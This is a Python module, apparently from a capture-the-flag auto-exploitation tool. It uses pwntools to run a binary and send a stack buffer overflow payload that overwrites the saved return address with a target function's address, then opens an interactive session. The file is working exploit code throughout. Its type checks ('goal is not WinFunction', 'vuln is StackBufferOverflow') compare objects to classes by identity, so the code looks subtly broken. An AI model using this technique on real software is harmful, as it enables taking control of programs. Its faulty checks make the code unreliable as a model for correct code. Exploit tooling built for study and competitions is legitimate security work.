from dataclasses import dataclass
from goals import Goal, WinFunction
from pwn import p64, process
from vulns import Vulnerability, StackBufferOverflow

@dataclass
class ExploitError(Exception):
    message: str

def exploit(goal: Goal, vulns: list[Vulnerability], path: str):
    p = process(path)
    payload = gen_payload(goal, vulns)
    p.sendline(payload)
    p.interactive()

def gen_payload(goal: Goal, vulns: list[Vulnerability]) -> bytes:
    if goal is not WinFunction:
        raise ExploitError("Only WinFunction goals are supported")

    for vuln in vulns:
        if vuln is StackBufferOverflow:
            return gen_stack_buffer_overflow_payload(vuln, goal)

    raise ExploitError("Payload generation requires a StackBufferOverflow vulnerability")

def gen_stack_buffer_overflow_payload(vuln: StackBufferOverflow, goal: WinFunction) -> bytes:
    payload = b"A" * vuln.saved_rip_offset + p64(goal.addr)
    if vuln.max_write_size is not None and len(payload) > vuln.max_write_size:
        raise ExploitError("Payload exceeds vulnerability max write size")
    return payload
